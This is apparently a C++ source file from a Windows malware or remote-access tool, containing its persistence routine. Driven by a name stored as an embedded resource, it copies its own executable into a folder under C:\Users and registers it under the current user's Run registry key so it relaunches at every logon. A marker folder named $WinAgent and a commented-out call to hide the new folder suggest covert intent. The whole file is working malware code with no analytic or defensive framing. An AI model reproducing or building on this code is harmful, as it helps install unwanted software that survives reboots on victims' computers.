#include "persist.h"
#include "ntdll.h"

void copyExe(const std::string& generatedName);
void regStartupKey(const std::string& generatedName);

void persist()
{
    HRSRC persistenceResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PERSISTENCE1), L"persistence");
    HGLOBAL persistenceResourceHandle = LoadResource(NULL, persistenceResource);
    char* persistence = (char*)LockResource(persistenceResourceHandle);
    FreeResource(persistenceResourceHandle);

    if (*persistence != '0') 
    {
        struct stat buffer;
        std::string path = "C:\\$WinAgent";

        if (stat(path.c_str(), &buffer) != 0)
        {
            copyExe(persistence);
            sleep2();
            regStartupKey(persistence);
        }
    }
}

void copyExe(const std::string& generatedName)
{
    std::wstring folderName(generatedName.begin(), generatedName.end());
    std::wstring newfolder = std::wstring() + L"C:\\Users\\" + folderName;
    char filename[MAX_PATH];
    std::string newLocation = std::string() + "C:\\Users\\" + generatedName + "\\" + generatedName + ".exe";
    CreateDirectory(newfolder.c_str(), NULL);
    //SetFileAttributes(newfolder.c_str(), FILE_ATTRIBUTE_HIDDEN);
    GetModuleFileNameA(NULL, filename, MAX_PATH);
    CopyFileA(filename, newLocation.c_str(), FALSE);
}

void regStartupKey(const std::string& generatedName)
{
    HKEY hkey = NULL;
    std::wstring wRegName(generatedName.begin(), generatedName.end());
    std::wstring progPath = std::wstring() + L"C:\\Users\\" + wRegName + L"\\" + wRegName + L".exe";
    RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
    RegSetValueEx(hkey, wRegName.c_str(), 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
    RegCloseKey(hkey);
}
